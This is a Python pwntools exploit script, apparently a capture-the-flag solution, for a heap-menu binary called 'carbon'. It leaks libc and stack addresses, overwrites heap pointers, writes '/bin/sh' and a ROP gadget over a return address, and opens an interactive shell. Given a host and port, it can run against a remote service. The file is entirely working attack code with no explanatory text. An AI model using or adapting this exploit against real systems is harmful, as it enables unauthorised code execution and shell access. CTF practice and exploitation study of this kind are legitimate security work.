#coding=utf-8

##########################################################################
# File Name: pwn_exp.py
# Author: sofr
# mail: rainb0w.541.bai@gmail.com
# Created Time: Tue Mar 10 13:10:01 2020
#########################################################################

from pwn import *
import sys
context.log_level = 'debug'

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sf = lambda x,y:p.sendafter(x,y)
slf = lambda x,y:p.sendlineafter(x,y)
l64_addr = lambda x:u64(x.ljust(0x8,'\x00'))
l32_addr = lambda x:u32(x.ljust(0x4,'\x00'))
drop_end = lambda x,y:x.split(y)[0]
getshell = lambda :p.interactive()

binary='./carbon'
libc_name = './libc.so'

global p
libc = ELF(libc_name)
#bin = ELF(binary)

if len(sys.argv) > 1:
    p=remote(sys.argv[1],int(sys.argv[2]))
else:
    p=process([binary],env={'LD_PRELOAD':libc_name})

def ShowAddress(s,addr):
    print('\033[1;31m%s: 0x%x\033[0m'%(s,addr))

def Success(context):
    success('\033[1;32m%s\033[0m'%(context))

def Error(context):
    warn('\033[1;31m%s\033[0m'%(context))

def debug():
    Success(pidof(p))
    raw_input('\033[1;31mDeBug\033[0m')


def add(size,content,flag="N"):
    slf("> ","1")
    slf("What is your prefer size? >",str(size))
    slf("Are you a believer? >",flag)
    slf("Say hello to your new sleeve >",content)

def dele(idx):
    slf("> ","2")
    slf("What is your sleeve ID? >",str(idx))


def edit(idx,content):
    slf("> ","3")
    slf("What is your sleeve ID? >",str(idx))
    time.sleep(0.2)
    sl(content)

def show(idx):
    slf("> ","4")
    slf("What is your sleeve ID? >",str(idx))

def pwn():
    add(0x20,"sofr_is_")
    add(0x8,"sofrcool")
    show(1)
    ru("sofrcool")
    libc_addr = l64_addr(ru("\x7f")) - 0x292e38
    add(0x10,"2")
    add(0x20,"3")
    add(0x80,"4")
    add(0x80,"4")
    dele(1)
    dele(3)
    add(0x10,p64(0xdeadbeef)*6+p64(0)+p64(0x40)+p64(0x290038+libc_addr)*2,"Y")
    add(0x20,"sofr")
    edit(4,p64(libc_addr + 0x290008)+p64(0x80)+p64(0x602034)+p64(0x10)+p64(libc_addr + 0x294fd8)+p64(0x80))
    edit(4,"\x00")
    show(5)
    stack_addr = l64_addr(ru("\x7f"))
    eip_addr = stack_addr - 0x70
    rop_addr = 0x0000000000014862 + libc_addr
    edit(3,"/bin/sh\x00"+p64(0x80)+p64(eip_addr))
    debug()
    edit(1,p64(rop_addr)+p64(0x290008+libc_addr)+p64(0x42688+libc_addr))
    ShowAddress("haha",libc_addr+0x290000)
    ShowAddress("libc",libc_addr)
    ShowAddress("stack",stack_addr)

    debug()
    getshell()


pwn()
